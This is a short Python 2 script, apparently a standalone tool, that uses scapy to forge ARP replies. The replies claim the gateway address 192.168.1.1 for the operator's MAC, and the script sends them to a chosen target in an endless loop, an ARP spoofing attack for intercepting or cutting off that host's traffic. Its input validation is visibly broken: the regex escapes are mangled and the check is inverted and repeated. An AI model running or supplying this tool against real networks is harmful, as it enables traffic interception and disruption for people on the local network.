import os
import re
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #remove the scapy ipv6 warning message

from scapy.all import *
import time

#CheckipFormat is only uesd in ipv4 address
def CheckipFormat(ip):
    pattern = "\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"
    if re.match(pattern, ip):
         return True
    else:
         return False

def build_arp_pkt(target_ip,interface_mac):
    target_mac = getmacbyip(target_ip)
    pkt = Ether(src =interface_mac, dst =target_mac) / ARP(hwsrc =interface_mac, psrc = '192.168.1.1', hwdst =target_mac, pdst =target_ip, op=2)
    return pkt


if __name__ == '__main__':
    if os.geteuid() !=0:
        print r'***run this program as root***'
        sys.exit(1)

    print r'input the target ip address(ivp4 only)'
    target_ip =raw_input()

    if CheckipFormat(target_ip):
        print r'***You input a wrong ip format'
        sys.exit(1)

    print  r'input the interface you want to ues'
    interface =raw_input()
    try:
        interface_mac = get_if_hwaddr(interface)
    except IOError:
        print 'no device'

    if CheckipFormat(target_ip):
        print r'***You input a wrong ip format'
        sys.exit(1)

    pkt = build_arp_pkt(target_ip,interface_mac)

    while True:
        sendp(pkt, iface =interface, inter=2)
    
